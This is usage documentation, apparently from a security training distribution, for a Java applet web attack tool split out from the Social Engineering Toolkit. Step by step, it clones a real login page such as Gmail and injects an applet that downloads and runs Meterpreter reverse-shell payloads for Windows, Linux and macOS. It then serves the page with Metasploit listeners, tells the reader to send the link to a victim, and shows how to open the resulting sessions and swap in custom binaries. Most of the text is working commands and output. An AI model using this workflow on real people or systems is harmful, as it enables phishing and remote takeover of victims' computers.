Java Applet Web Attack
======================

Website
-------

<https://bitbucket.org/ethanr/java-web-attack>

Description
-----------

This project aims to break out the Java Applet Web Attack method from the Social Engineering Toolkit into a standalone tool.

Install Location
----------------

`/opt/java-web-attack/`

Usage
-----

`~$` **`cd /opt/java-web-attack`**

`/opt/java-web-attack$` **`./clone.sh <url to clone>`**
  
`/opt/java-web-attack$` **`./weaponize.py -h`**

        Usage:
          ./weaponize.py [-w <payload>] [-l <payload>] [-m <payload>] <html_file> <ip>
          ./weaponize.py -h
        
        Options:
          -h            Shows this help message.
          -w            Specifies the Windows payload to use. [default: windows/meterpreter/reverse_tcp]
          -l            Specifies the Linux payload to use. [default: linux/x86/meterpreter/reverse_tcp]
          -m            Specifies the Mac OS X payload to use. [default: osx/x86/shell_reverse_tcp]
          <payload>     The payload string as expected by msfvenom. Run `msfvenom -l payloads` to see all choices.
          <html_file>   The HTML file to insert the Java payload.
          <ip>          The IP address the payload should connect back to.
        
        Note: The default ports used for the Windows, Linux, and Mac listeners are 3000, 3001, and 3002 respectively.

`/opt/java-web-attack$` **`./serve.sh`**

Video Walkthrough
-----------------

<video controls>
  <source src="Videos/1_550_Java_App_Evil.mp4">
  <source src="https://onedrive.live.com/download.aspx?cid=8D6C4317A39E3D29&resid=8D6C4317A39E3D29%2155668&canary=">
 <p>Your browser does not support html5 video.</p>
</video>

Example 1: Cloning a URL
------------------------

The `clone.sh` script is a small convenience wrapper arount the following `wget` command:

`wget --no-check-certificate -O index.html -c -k -U "$chromeUA" "$1"`

Where `$chromeUA` is Google Chrome's User Agent string and `$1` is the URL to clone.

To run the script simply pass in the URL you wish to clone. For example, to clone Gmail run:

`/opt/java-web-attack$` **`./clone.sh https://gmail.com`**

        <<<snip>>>
        Saving to: ‘index.html’
            [ <=>         ] 74,115      --.-K/s   in 0.1s
        2015-02-21 02:52:13 (649 KB/s) - ‘index.html’ saved [74115]
        Converting index.html... 0-9
        Converted 1 files in 0.001 seconds.

As shown in the output, the file is saved to **index.html**. You can open this file in your web browser to see that
it was successfully cloned.

Example 2: Weaponizing a Web Page
---------------------------------

You need an HTML page and your IP address so that the payloads know where to connect. You can get an HTML page by cloning an existing site as in Example 1 or you can use the **example_gmail.html** file provided.

The basic usage of the `weaponize.py` script is to pass in the HTML file to modify and then the IP address of your ADHD machine.

`/opt/java-web-attack$` **`./weaponize.py index.html 172.16.215.138`**

        Generating Windows payload: windows/meterpreter/reverse_tcp...
        Generating Linux payload: linux/x86/meterpreter/reverse_tcp...
        Generating Mac OS X payload: osx/x86/shell_reverse_tcp...
        Weaponizing html...
        Creating listener resource script...
        All output written to the "output" directory.
        
        Run "serve.sh" to easily stand up a server.

All files generated are saved in the **output** directory. The directory should now contain these files:

* index.html - Copy of the HTML file you specified, now weaponized to deliver the Java applet payload.
* applet.jar - The Java applet that is inserted into the page.
* msf.exe - The Windows binary that the Java applet downloads and executes.
* nix.bin - The Linux binary that the Java applet downloads and executes.
* mac.bin - The Mac OS X binary that the Java applet downloads and executes.
* listeners.rc - A Metasploit resource file that starts listeners for each of the payloads for you.

Example 3: Starting the Attack Server
-------------------------------------

Setting up the server to deliver the weaponized page, payloads, and handlers requires an HTTP server and Metasploit. You can use any HTTP server, such as Apache. `weaponize.py` generates a **listeners.rc** file in the **output** directory that will set up the payload listeners.

`serve.sh` automates these steps for you. It will stop the Apache web server if it is running, start up a lightweight Python HTTP server, and run `msfconsole` with the generated resource script to set up the payload listeners. It will take a minute or two to completely set up the payload listeners so please be patient.

Note: Since this shuts down Apache during the attack, you will be unable to access these intructions through the normal method. Please leave this page open without refreshing until you have completed the exercise and restarted Apache.

`/opt/java-web-attack$` **`./serve.sh`**

        Shutting down Apache...
         * Stopping web server apache2 *
        Starting python web server...
        Now starting payload listeners. Please be patient.
        [*] Starting the Metasploit Framework console...
        <<<snip>>>
        [*] Started reverse handler on 172.16.215.138:3000
        <<<snip>>>
        [*] Started reverse handler on 172.16.215.138:3001
        <<<snip>>>
        [*] Started reverse handler on 172.16.215.138:3002
        <<<snip>>>
        You may now surf to http://172.16.215.138/
        msf exploit(handler) >

Once you see the text **You may now surf to** you are all set. Visit the URL provided in your browser or send it to your victim. When you do, accept the Java prompts and you should see feeback in your console window saying that you have a new session.

        [*] Sending stage (770048 bytes) to 172.16.215.137
        [*] Meterpreter session 1 opened (172.16.215.138:3000 -> 172.16.215.137:1104)

You may interact with your session by using the session number shown in your own output. In this case, it is session number 1.

**`sessions -i 1`**

        [*] Starting interaction with 1...
        meterpreter >

Example 4: Stopping the Attack Server
-------------------------------------

To stop the Metasploit listeners and shut down the Python web server, type `exit` into the Metasploit console window. You may have to type it more than once if you were also in a meterpreter session.

Finally, you will need to restart Apache.

`/opt/java-web-attack$` **`sudo service apache2 start`**

Note: If this does not work, rebooting your machine will.

Example 5: Customizing the Payloads
-----------------------------------

There are a few ways to customize the payloads used by `weaponize.py`. 

The first is through command line arguments to the script itself. For instance, to customize the Windows and Linux payloads (but leave the OSX payload as default) run:

`/opt/java-web-attack$` **`./weaponize.py -w windows/x64/meterpreter/reverse_https -l linux/x64/meterpreter/reverse_tcp index.html 172.16.215.138`**

In this instance, we specified **windows/x64/meterpreter/reverse_https** in order to use the 64-bit Meterpreter communicating over HTTPS for the Windows payload and **linux/x64/meterpreter/reverse_tcp** to use the 64-bit variant of the default Linux payload.

For a full listing of available payloads you can run the following:

`/opt/java-web-attack$` **`msfvenom -l payloads`**

As there are many payloads available, you may wish to filter them using `grep` to only show one operating system at a time.

`/opt/java-web-attack$` **`msfvenom -l payloads | grep windows`**

---

By default, the ports used for the Windows, Linux, and OSX payloads are 3000, 3001, and 3002, respectively. To customize these ports you will need to edit the **weaponize.py** file. Near the top, you will find these lines where you can customize the ports used.

    WINDOWS_PORT = 3000
    LINUX_PORT = 3001
    OSX_PORT = 3002

Edit the file, save your changes, and rerun `weaponize.py` (follow Example 2) to regenerate your payloads.

---

The third way you can customize the payloads used is to use your own binary files entirely. To do this, simply follow the instructions in Example 2 so that you end up with the **output** directory containing the necessary files. Then replace one or more of the following with the custom executables of your choice.

* msf.exe - The Windows binary that the Java applet downloads and executes.
* nix.bin - The Linux binary that the Java applet downloads and executes.
* mac.bin - The Mac OS X binary that the Java applet downloads and executes.

Note: You will need to set up your own payload listeners if you replace the payload binaries.

